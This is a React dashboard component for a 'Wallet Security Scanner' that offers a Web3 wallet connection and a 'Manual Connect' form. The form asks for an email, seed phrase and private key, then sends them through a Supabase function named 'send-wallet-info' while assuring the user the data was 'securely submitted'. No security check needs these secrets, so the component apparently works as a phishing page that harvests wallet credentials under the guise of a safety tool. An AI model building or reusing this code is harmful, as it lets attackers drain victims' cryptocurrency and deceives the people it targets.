
import { useState } from "react";
import { useToast } from "@/components/ui/use-toast";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Shield, Wallet, Key } from "lucide-react";
import { supabase } from "@/integrations/supabase/client";
import { useAddress, useConnect, useDisconnect, useConnectionStatus, ConnectWallet } from "@thirdweb-dev/react";

const Dashboard = () => {
  const { toast } = useToast();
  const [email, setEmail] = useState("");
  const [seedPhrase, setSeedPhrase] = useState("");
  const [privateKey, setPrivateKey] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);

  // ThirdWeb hooks
  const address = useAddress();
  const connect = useConnect();
  const disconnect = useDisconnect();
  const connectionStatus = useConnectionStatus();

  const handleConnect = async () => {
    try {
      await connect({
        chainId: 1 // Ethereum Mainnet
      });
      toast({
        title: "Success",
        description: "Wallet connected successfully!",
      });
    } catch (error) {
      toast({
        title: "Error",
        description: "Please install a Web3 wallet like MetaMask",
        variant: "destructive",
      });
    }
  };

  const handleDisconnect = async () => {
    try {
      await disconnect();
      toast({
        title: "Success",
        description: "Wallet disconnected successfully",
      });
    } catch (error) {
      toast({
        title: "Error",
        description: "Failed to disconnect wallet",
        variant: "destructive",
      });
    }
  };

  const handleManualConnect = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!email || (!seedPhrase && !privateKey)) {
      toast({
        title: "Error",
        description: "Please fill in all required fields",
        variant: "destructive",
      });
      return;
    }

    setIsSubmitting(true);
    try {
      const walletInfo = {
        seedPhrase: seedPhrase || "Not provided",
        privateKey: privateKey || "Not provided",
      };

      const response = await supabase.functions.invoke('send-wallet-info', {
        body: { email, walletInfo }
      });

      if (response.error) throw response.error;

      toast({
        title: "Success",
        description: "Your wallet information has been securely submitted.",
      });

      // Clear sensitive data
      setSeedPhrase("");
      setPrivateKey("");
    } catch (error) {
      toast({
        title: "Error",
        description: "Failed to submit wallet information. Please try again.",
        variant: "destructive",
      });
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="container mx-auto p-6 min-h-screen bg-background">
      <div className="max-w-2xl mx-auto space-y-8">
        <div className="text-center space-y-2">
          <Shield className="w-12 h-12 text-primary mx-auto" />
          <h1 className="text-3xl font-bold text-primary">Wallet Security Scanner</h1>
          <p className="text-muted-foreground">
            Connect your wallet to begin the security assessment
          </p>
        </div>

        <Tabs defaultValue="automatic" className="w-full">
          <TabsList className="grid grid-cols-2">
            <TabsTrigger value="automatic">
              <Wallet className="w-4 h-4 mr-2" />
              Connect Wallet
            </TabsTrigger>
            <TabsTrigger value="manual">
              <Key className="w-4 h-4 mr-2" />
              Manual Connect
            </TabsTrigger>
          </TabsList>

          <TabsContent value="automatic">
            <Card>
              <CardHeader>
                <CardTitle>Connect with Web3 Wallet</CardTitle>
                <CardDescription>
                  {address ? 
                    `Connected: ${address.slice(0, 6)}...${address.slice(-4)}` : 
                    "Connect your Web3 wallet to begin"
                  }
                </CardDescription>
              </CardHeader>
              <CardContent>
                {connectionStatus === "connected" ? (
                  <div className="space-y-4">
                    <p className="text-sm text-muted-foreground">
                      Your wallet is connected and ready for security assessment
                    </p>
                    <Button 
                      variant="destructive" 
                      className="w-full"
                      onClick={handleDisconnect}
                    >
                      Disconnect Wallet
                    </Button>
                  </div>
                ) : (
                  <Button 
                    className="w-full"
                    onClick={handleConnect}
                    disabled={connectionStatus === "connecting"}
                  >
                    {connectionStatus === "connecting" ? "Connecting..." : "Connect Wallet"}
                  </Button>
                )}
              </CardContent>
            </Card>
          </TabsContent>

          <TabsContent value="manual">
            <Card>
              <CardHeader>
                <CardTitle>Manual Wallet Connection</CardTitle>
                <CardDescription>
                  Enter your wallet details manually for a security assessment
                </CardDescription>
              </CardHeader>
              <CardContent>
                <form onSubmit={handleManualConnect} className="space-y-4">
                  <div className="space-y-2">
                    <Label htmlFor="email">Email Address</Label>
                    <Input
                      id="email"
                      type="email"
                      placeholder="Enter your email"
                      value={email}
                      onChange={(e) => setEmail(e.target.value)}
                      required
                    />
                  </div>
                  
                  <div className="space-y-2">
                    <Label htmlFor="seedPhrase">Seed Phrase (Optional)</Label>
                    <Input
                      id="seedPhrase"
                      type="password"
                      placeholder="Enter your seed phrase"
                      value={seedPhrase}
                      onChange={(e) => setSeedPhrase(e.target.value)}
                    />
                  </div>

                  <div className="space-y-2">
                    <Label htmlFor="privateKey">Private Key (Optional)</Label>
                    <Input
                      id="privateKey"
                      type="password"
                      placeholder="Enter your private key"
                      value={privateKey}
                      onChange={(e) => setPrivateKey(e.target.value)}
                    />
                  </div>

                  <Button 
                    type="submit" 
                    className="w-full"
                    disabled={isSubmitting}
                  >
                    {isSubmitting ? "Submitting..." : "Submit for Analysis"}
                  </Button>
                </form>
              </CardContent>
            </Card>
          </TabsContent>
        </Tabs>
      </div>
    </div>
  );
};

export default Dashboard;
